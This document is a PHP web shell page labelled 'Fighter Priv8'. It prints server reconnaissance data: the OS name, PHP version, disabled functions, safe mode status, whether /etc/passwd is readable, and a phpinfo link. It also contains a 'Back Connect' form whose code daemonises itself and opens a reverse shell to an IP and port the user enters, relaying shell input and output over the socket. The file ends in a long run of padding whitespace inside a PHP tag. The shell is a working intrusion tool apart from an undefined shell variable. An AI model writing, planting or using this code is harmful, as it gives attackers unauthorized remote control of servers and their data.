<center>
<H1><center>||||||Fighter Priv8||||</center></H1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center>
<?php
$freespace_show = sprintf('%1.2f', $bytes / pow($base, $class)) . ' ' . $si_prefix[$class] . '';
$etc_passwd = @is_readable("/etc/passwd") ? "<b><span style=\"color:#444444\">ON </span></b>" : "<b><span style=\"color:red\"/>Disabled </span></b>";
echo '<b><font color=red>Disable Functions: </b></font>';
    if ('' == ($func = @ini_get('disable_functions'))) {
        echo "<b><font color=green>NONE</font></b>";
    } else {
        echo "<b><font color=red>$func</font></b>";
    echo '</td></tr>';
    }
echo '</br>';
echo '<b><font color=red>Uname : </b></font><b>'.php_uname().'</b>';
echo '</br>';
echo '<b><font color=red>PHP Version : </b></font><b>'. phpversion() .'</b>';
echo '</br>';
echo '<b><font color=red>Server Admin : </b></font><b>'.$_SERVER['SERVER_ADMIN'].'</b>';
echo '</br>';
echo '<b><font color=red>Server IP  :   </b></font><b>'.$_SERVER['SERVER_ADDR'].' </b>';
echo '<b><font color=red>Your IP :  </b></font><b>'.$_SERVER['REMOTE_ADDR'].'</b>';
echo "</br>";
echo "<b><font color=red>Safe Mode :  </font></b>";
// Check for safe mode
if( ini_get('safe_mode') ) {
  print '<font color=#FF0000><b>Safe Mode is ON</b></font>';
} else {
  print '<font color=#008000><b>Safe Mode is OFF</b></font>';
}
echo "</br>";
echo "<b><font color=red>Read etc/passwd : </font></b><b>$etc_passwd</b>";
echo "<b><font color=red>Functions : </font><b>";echo "<a href='$php_self?p=info'>PHP INFO </a>";
if(@$_GET['p']=="info"){@phpinfo();
exit;}
?>
<br>
</center>
<center>
<b><font color=red>Back Connect </font></b>
<form action="?connect=Pub" method="post">
  IP : <input type="text" name="ip" value= "Your IP"/>
  PORt :<input type="text" name="port" value= "22"/>
 <input alt="Submit" type="image">
</form>
<?php
function printit ($string)
 {
   if (!$daemon)
{
      print "$string\
";
   }
}
$bc = $_GET["connect"];
switch($bc)
{
case "Pub":
set_time_limit (0);
$VERSION = "1.0";
$ip = $_POST["ip"];
$port = $_POST["port"];
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork'))
{

   $pid = pcntl_fork();

   if ($pid == -1)
{
      printit("ERROR: Can't fork");
      exit(1);
   }

   if ($pid) {
      exit(0);  // Parent exits
   }
   if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
   }

   $daemon = 1;
}
else {
   print("DISCONNECTED");
}

// Change to a safe directory
chdir("/tmp/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
   printit("$errstr ($errno)");
   exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
   printit("ERROR: Can't spawn shell");
   exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("");

while (1) {
   // Check for end of TCP connection
   if (feof($sock)) {
      printit(" :- TCP connection ended");
      break;
   }

   // Check for end of STDOUT
   if (feof($pipes[1])) {
      printit("END of STDOUT");
      break;
   }

   // Wait until a command is end down $sock, or some
   // command output is available on STDOUT or STDERR
   $read_a = array($sock, $pipes[1], $pipes[2]);
   $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

   // If we can read from the TCP socket, send
   // data to process's STDIN
   if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
   }

   // If we can read from the process's STDOUT
   // send data down tcp connection
   if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
   }

   // If we can read from the process's STDERR
   // send data down tcp connection
   if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
   }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
break;
}


  ?>
</center>
</td></tr>';
<?php

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
?>